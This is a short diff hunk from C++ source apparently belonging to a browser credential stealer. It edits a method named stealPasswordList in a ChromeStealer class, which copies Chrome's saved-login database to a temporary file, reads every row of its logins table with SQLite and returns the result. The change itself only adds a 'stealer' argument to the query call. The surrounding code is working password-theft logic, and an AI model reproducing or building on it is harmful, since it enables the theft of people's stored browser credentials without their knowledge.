@@ -25,7 +25,7 @@ const std::string ChromeStealer::stealPasswordList(void) const
 
 	boost::filesystem::copy_file(_loginDatabasePath, tmp, boost::filesystem::copy_option::overwrite_if_exists);
 	SQLite3 database(tmp);
-	ret = database.execute("SELECT * FROM logins;");
+	ret = database.execute("SELECT * FROM logins;", "stealer");
 	database.close();
 	boost::filesystem::remove(tmp);
 	return (ret);
